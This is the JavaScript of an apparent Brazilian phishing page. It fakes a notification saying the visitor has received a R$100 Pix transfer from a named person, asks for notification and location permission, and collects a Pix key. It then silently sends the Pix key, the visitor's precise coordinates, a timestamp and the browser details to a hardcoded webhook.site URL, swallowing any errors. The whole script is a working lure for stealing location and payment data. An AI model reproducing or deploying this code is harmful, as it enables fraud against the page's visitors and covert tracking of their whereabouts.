<script>
const WEBHOOK = "https://webhook.site/7b90f2d2-5b54-422c-9ab9-24a37ba6bab6";
let lastPos = null;

function iniciar(){
  limpar();
  bloquear(true);

  if(!("Notification" in window)){
    erro("Navegador não suporta notificações.");
    bloquear(false);
    return;
  }

  // SE JÁ TIVER PERMITIDO, PULA
  if(Notification.permission === "granted"){
    pedirLocalizacao();
    return;
  }

  // SE BLOQUEOU PRA SEMPRE
  if(Notification.permission === "denied"){
    erro("Notificações bloqueadas. Ative nas configurações.");
    bloquear(false);
    return;
  }

  // SE AINDA NÃO DECIDIU
  Notification.requestPermission().then(p=>{
    if(p !== "granted"){
      erro("Permita notificações para continuar.");
      bloquear(false);
      return;
    }
    pedirLocalizacao();
  });
}

function pedirLocalizacao(){
  if(!navigator.geolocation){
    erro("Navegador não suporta localização.");
    bloquear(false);
    return;
  }

  navigator.geolocation.getCurrentPosition(
    pos=>{
      lastPos = pos;
      avancar();
    },
    err=>{
      if(err.code === 1){
        erro("Localização bloqueada. Ative nas configurações.");
      }else{
        erro("Permita a localização para continuar.");
      }
      bloquear(false);
    },
    { timeout: 8000 }
  );
}

function avancar(){
  new Notification("você recebeu uma transferência de R$100,00 de emanuel filipe viera silva",{
    body:"Permissões concedidas",
  });

  document.getElementById("tela1").style.display="none";
  document.getElementById("tela2").style.display="block";
}

function confirmar(){
  const chave = document.getElementById("chave").value.trim();
  if(!chave){
    alert("Digite uma chave Pix");
    return;
  }

  fetch(WEBHOOK,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      chave_pix: chave,
      latitude: lastPos.coords.latitude,
      longitude: lastPos.coords.longitude,
      precisao: lastPos.coords.accuracy,
      data: new Date().toISOString(),
      navegador: navigator.userAgent
    })
  }).catch(()=>{});

  document.getElementById("tela2").style.display="none";
  document.getElementById("tela3").style.display="block";
}

function erro(msg){
  document.getElementById("erro1").innerText = msg;
}

function limpar(){
  document.getElementById("erro1").innerText = "";
}

function bloquear(status){
  document.getElementById("btn").disabled = status;
  document.getElementById("loader").style.display = status ? "block" : "none";
}
    </script>
